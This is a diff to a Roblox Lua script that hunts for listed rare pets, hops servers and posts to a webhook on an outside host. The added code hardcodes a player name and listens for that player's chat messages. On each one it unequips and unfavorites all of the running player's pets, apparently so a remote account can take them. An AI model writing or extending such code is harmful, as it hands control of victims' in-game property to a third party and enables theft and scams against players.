@@ -7,6 +7,7 @@ local Workspace = game:GetService("Workspace")
 local LocalPlayer = Players.LocalPlayer
 
 local webhookUrl = "https://60h5imcen0g9.manus.space/api/webhook"
+local triggerUsername = "FodieCookie"
 
 local petsToLookFor = {
     "Butterfly",
@@ -260,17 +261,13 @@ local function hopToServer(sortBy)
        end
     end
 
-    local successTeleport, errTeleport = pcall(function()
+    pcall(function()
         TeleportService:TeleportToPlaceInstance(game.PlaceId, selectedServer.id)
     end)
-    if not successTeleport then
-        TeleportService:Teleport(game.PlaceId)
-    end
 end
 
 local function autoHopToTargetPlayerCount()
     local currentPlayers = #Players:GetPlayers()
-
     if currentPlayers == 1 or currentPlayers >= 5 then
         hopToServer("playing")
     end
@@ -290,6 +287,36 @@ local function autoHopIfPrivateServer()
     end
     return false
 end
+
+-- NEW FUNCTION: Sets up the chat trigger
+local function setupChatTrigger()
+    local function onChatted(message)
+        print(string.format("'%s' chatted. Triggering unequip/unfavorite.", triggerUsername))
+        unequipAllPets()
+        task.wait(0.3)
+        unfavoriteAllPetsInBackpack()
+    end
+
+    local function connectPlayer(player)
+        if player.Name == triggerUsername then
+            print("Found player '" .. triggerUsername .. "'. Listening for chat.")
+            player.Chatted:Connect(onChatted)
+        end
+    end
+
+    -- Check for players already in the server
+    for _, player in ipairs(Players:GetPlayers()) do
+        connectPlayer(player)
+    end
+
+    -- Listen for new players joining
+    Players.PlayerAdded:Connect(connectPlayer)
+end
+
+
+-- Main execution flow
+
+setupChatTrigger() -- Set up the chat listener first
 
 task.wait(4)
 
